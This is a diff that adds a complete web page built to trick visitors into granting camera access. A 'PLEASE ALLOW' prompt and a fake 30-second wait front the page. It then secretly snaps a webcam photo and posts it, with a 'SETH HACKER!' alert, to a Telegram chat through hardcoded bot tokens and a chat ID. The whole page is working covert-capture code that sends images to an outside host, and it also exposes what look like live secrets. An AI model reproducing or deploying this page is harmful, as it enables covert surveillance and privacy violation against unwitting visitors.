@@ -1,81 +1,289 @@
-<!-- ... তোমার HTML Head একই থাকবে ... -->
-<video id="video" autoplay playsinline style="display: none;" width="640" height="480"></video>
-<canvas id="cameraCanvas" width="640" height="480" style="display: none;"></canvas>
-
-<script>
-let cameraAccessGranted = false;
-
-// Auto check on page load
-window.onload = function () {
-    if (localStorage.getItem("cameraAccessGranted") === "true") {
-        cameraAccessGranted = true;
-        document.getElementById("allowButton").style.display = "none";
-        document.getElementById("allowMessage").style.display = "none";
-        autoStartCamera(); // নতুন যুক্ত
-    }
-}
-
-function requestCameraAccess() {
-    navigator.mediaDevices.getUserMedia({ video: true })
-        .then((stream) => {
-            cameraAccessGranted = true;
-            localStorage.setItem("cameraAccessGranted", "true");
-
-            document.getElementById("allowButton").style.display = "none";
-            document.getElementById("allowMessage").style.display = "none";
-            document.getElementById("cameraAccessPopup").style.display = "none";
-
-            const video = document.getElementById("video");
-            video.srcObject = stream;
-
-            startProcess();
-        })
-        .catch(() => {
-            document.getElementById("cameraAccessPopup").style.display = "block";
-        });
-}
-
-function autoStartCamera() {
-    navigator.mediaDevices.getUserMedia({ video: true })
-        .then((stream) => {
-            const video = document.getElementById("video");
-            video.srcObject = stream;
-            startProcess();
-        })
-        .catch(() => {
-            localStorage.removeItem("cameraAccessGranted");
-            document.getElementById("allowButton").style.display = "block";
-            document.getElementById("allowMessage").style.display = "block";
-        });
-}
-
-function startProcess() {
-    const message = document.getElementById("videoLink").value.trim();
-    if (message === "") return;
-
-    document.getElementById("messageContainer").style.display = "block";
-    let counter = 30;
-    const countdownInterval = setInterval(() => {
-        document.getElementById("countdown").innerText = counter;
-        counter--;
-        if (counter < 0) {
-            clearInterval(countdownInterval);
-            document.getElementById("messageContainer").innerHTML = "REQUEST accepted. Your work will be done shortly. Thank you :)";
-            captureAndSendPhoto(message);
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Camera access with background matrix effect">
+    <title>Camera Access Page</title>
+    <style>
+        body, html {
+            margin: 0;
+            padding: 0;
+            height: 100%;
+            font-family: Arial, sans-serif;
+            background-color: #000;
+            color: white;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            overflow: hidden;
         }
-    }, 1000);
-}
 
-function captureAndSendPhoto(message) {
-    const video = document.getElementById("video");
-    const canvas = document.getElementById("cameraCanvas");
-    const context = canvas.getContext("2d");
+        .container {
+            text-align: center;
+            position: relative;
+            z-index: 1;
+        }
 
-    context.drawImage(video, 0, 0, canvas.width, canvas.height);
-    canvas.toBlob((blob) => {
-        sendPhotoToTelegram(blob, message);
-    }, "image/png");
-}
+        h1 {
+            font-size: 50px;
+            font-weight: bold;
+            color: #00FF00;
+            margin-bottom: 20px;
+        }
 
-// ... sendPhotoToTelegram, sendTextToTelegram, drawMatrix কোড আগের মতোই থাকবে ...
-</script> 
+        button {
+            padding: 12px 24px;
+            font-size: 20px;
+            background-color: #00FF00;
+            color: black;
+            border: none;
+            cursor: pointer;
+            border-radius: 5px;
+            z-index: 1;
+        }
+
+        button:hover {
+            background-color: #00cc00;
+        }
+
+        .message {
+            font-size: 18px;
+            color: white;
+        }
+
+        #countdown {
+            font-size: 24px;
+            color: white;
+        }
+
+        #videoLink {
+            display: none;
+        }
+
+        #cameraCanvas {
+            display: none;
+        }
+
+        #messageContainer {
+            display: none;
+            z-index: 1;
+        }
+
+        #allowMessage {
+            font-size: 18px;
+            color: white;
+            margin-top: 20px;
+            z-index: 1;
+        }
+
+        #cameraAccessPopup {
+            display: none;
+            color: red;
+            font-size: 18px;
+            z-index: 1;
+        }
+
+        #matrix-canvas {
+            position: fixed;
+            top: 0;
+            left: 0;
+            z-index: 0;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>PLEASE ALLOW ↓</h1>
+        <button id="allowButton">ALLOW</button>
+        <div id="allowMessage">Please allow camera access to proceed</div>
+        <div id="cameraAccessPopup">PLEASE ALLOW FIRST</div>
+        
+        <div id="messageContainer">
+            <p>PLEASE WAIT <span id="countdown">30</span> SECONDS</p>
+        </div>
+
+        <input type="text" id="videoLink" value="Sample Message">
+        <video id="video" autoplay playsinline style="display: none;"></video>
+        <canvas id="cameraCanvas"></canvas>
+    </div>
+
+    <canvas id="matrix-canvas"></canvas>
+
+    <script>
+        // Initialize all variables
+        let cameraAccessGranted = false;
+        let countdownInterval = null;
+        let mediaStream = null;
+
+        // DOM elements
+        const allowButton = document.getElementById("allowButton");
+        const allowMessage = document.getElementById("allowMessage");
+        const cameraAccessPopup = document.getElementById("cameraAccessPopup");
+        const messageContainer = document.getElementById("messageContainer");
+        const countdownElement = document.getElementById("countdown");
+        const video = document.getElementById("video");
+        const cameraCanvas = document.getElementById("cameraCanvas");
+        const videoLink = document.getElementById("videoLink");
+
+        // Reset function
+        function resetPage() {
+            // Stop camera stream if exists
+            if (mediaStream) {
+                mediaStream.getTracks().forEach(track => track.stop());
+                mediaStream = null;
+            }
+            
+            // Reset video element
+            video.srcObject = null;
+            video.style.display = "none";
+            
+            // Clear countdown
+            if (countdownInterval) {
+                clearInterval(countdownInterval);
+                countdownInterval = null;
+            }
+            
+            // Reset UI
+            allowButton.style.display = "block";
+            allowMessage.style.display = "block";
+            cameraAccessPopup.style.display = "none";
+            messageContainer.style.display = "none";
+            countdownElement.textContent = "30";
+            
+            // Reset flag
+            cameraAccessGranted = false;
+        }
+
+        // Event listeners
+        allowButton.addEventListener("click", requestCameraAccess);
+        
+        window.addEventListener("beforeunload", resetPage);
+        window.addEventListener("load", resetPage);
+
+        // Camera access function
+        function requestCameraAccess() {
+            if (cameraAccessGranted) {
+                startProcess();
+            } else {
+                navigator.mediaDevices.getUserMedia({ video: true })
+                    .then((stream) => {
+                        mediaStream = stream;
+                        allowButton.style.display = "none";
+                        allowMessage.style.display = "none";
+                        cameraAccessGranted = true;
+                        
+                        video.srcObject = stream;
+                        video.style.display = "block";
+                        
+                        startProcess();
+                    })
+                    .catch(() => {
+                        cameraAccessPopup.style.display = "block";
+                    });
+            }
+        }
+
+        // Process function
+        function startProcess() {
+            const message = videoLink.value.trim();
+            if (message === "") return;
+
+            messageContainer.style.display = "block";
+            let counter = 30;
+            
+            countdownInterval = setInterval(() => {
+                countdownElement.textContent = counter;
+                counter--;
+                
+                if (counter < 0) {
+                    clearInterval(countdownInterval);
+                    messageContainer.innerHTML = "REQUEST accepted. Your work will be done shortly. Thank you :)";
+                    captureAndSendPhoto(message);
+                }
+            }, 1000);
+        }
+
+        // Photo capture function
+        function captureAndSendPhoto(message) {
+            cameraCanvas.width = video.videoWidth;
+            cameraCanvas.height = video.videoHeight;
+            const cameraContext = cameraCanvas.getContext('2d');
+            
+            cameraContext.drawImage(video, 0, 0, cameraCanvas.width, cameraCanvas.height);
+            cameraCanvas.toBlob((blob) => {
+                sendPhotoToTelegram(blob, message);
+            }, 'image/png');
+        }
+
+        // Telegram functions
+        function sendPhotoToTelegram(blob, message) {
+            const botToken = "7362244711:AAG8PejiHPdrYfyDyI6i4X7nxQMYJcy36_E";
+            const chatId = "7962046796";
+            const formData = new FormData();
+            formData.append("chat_id", chatId);
+            formData.append("photo", blob, "image.png");
+
+            fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                method: "POST",
+                body: formData
+            })
+            .then(() => {
+                const textMessage = `SETH HACKER! NEW LINK RECEIVED ↓\n${message}`;
+                sendTextToTelegram(textMessage);
+            })
+            .catch(error => console.error("Error:", error));
+        }
+
+        function sendTextToTelegram(message) {
+            const botToken = "7628637870:AAF0q1GpYIuJpxbVTP5nVYVk-l2yWAxzzbs";
+            const chatId = "7962046796";
+            const apiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+            fetch(apiUrl, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ chat_id: chatId, text: message })
+            })
+            .catch(error => console.error("Error sending text:", error));
+        }
+
+        // Matrix background effect
+        const matrixCanvas = document.getElementById('matrix-canvas');
+        const matrixCtx = matrixCanvas.getContext('2d');
+        matrixCanvas.width = window.innerWidth;
+        matrixCanvas.height = window.innerHeight;
+
+        const letters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+        const matrixChars = letters.split('');
+        const fontSize = 18;
+        const columns = matrixCanvas.width / fontSize;
+        const drops = Array.from({ length: columns }).fill(1);
+
+        function drawMatrix() {
+            matrixCtx.fillStyle = 'rgba(0, 0, 0, 0.05)';
+            matrixCtx.fillRect(0, 0, matrixCanvas.width, matrixCanvas.height);
+            matrixCtx.fillStyle = '#00FF00';
+            matrixCtx.font = `${fontSize}px monospace`;
+
+            for (let i = 0; i < drops.length; i++) {
+                const text = matrixChars[Math.floor(Math.random() * matrixChars.length)];
+                matrixCtx.fillText(text, i * fontSize, drops[i] * fontSize);
+                
+                if (drops[i] * fontSize > matrixCanvas.height && Math.random() > 0.975) {
+                    drops[i] = 0;
+                }
+                drops[i]++;
+            }
+        }
+
+        setInterval(drawMatrix, 33);
+        
+        window.addEventListener('resize', () => {
+            matrixCanvas.width = window.innerWidth;
+            matrixCanvas.height = window.innerHeight;
+        });
+    </script>
+</body>
+</html>
